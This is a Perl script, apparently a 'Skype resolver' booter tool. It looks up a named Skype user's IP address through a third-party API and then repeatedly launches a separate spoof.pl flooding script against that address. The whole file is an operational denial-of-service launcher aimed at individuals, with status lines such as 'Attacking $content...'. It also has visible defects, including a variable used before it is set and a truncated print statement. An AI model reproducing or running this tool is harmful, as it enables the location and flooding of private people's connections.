use IO::Socket;

my $skype    = $ARGV[0];
my $interval = $ARGV[1];
my $domain   = "api.speedresolve.com";
my $key      = "YOURKEYHERE";
my $cmd      = "perl spoof.pl $content 80 65500 $interval";

if ( $#ARGV != 1 ) {
    print "Usage: perl skypecloud.pl <skypename> <secondstocheck>\n";
    print "Made for www.speedresolve.com api\n";
    print "Please remember to edit the api key, and the script usage";
}

print
"\nStarting SkypeCloud\nChecking for New IP every $interval seconds\nAttacking Skype: $skype\n**PRESS CNTL + Z TO CLOSE**\nAPIserv$
while (1) {
    $socket = IO::Socket::INET->new(
        Proto    => 'tcp',
        PeerAddr => $domain,
        PeerPort => '80',
    ) or return $!;
    print $socket "GET /skype.php?key=" . $key . "&name=" . $skype
      . " HTTP/1.0\r\n";
    print $socket "Host: ", $domain, "\r\n";
    print $socket "Connection: close", "\r\n";
    print $socket
"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
      "\r\n";
    print $socket "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";

    my @array = <$socket>;
    push @array, my $content = pop @array;

    if ( $content =~ /Error: Failed to resolve the skype name./ ) {
        print "API is broke, re-resolving.";
    }
    else {
#Here add your script usage, $content where the ip goes, and $interval where the time goes.
        system("perl spoof.pl $content 80 65500 $interval");

        print "Attacking $content...\n";
    }
    print "Checking for ip, $interval seconds is over\n";
}
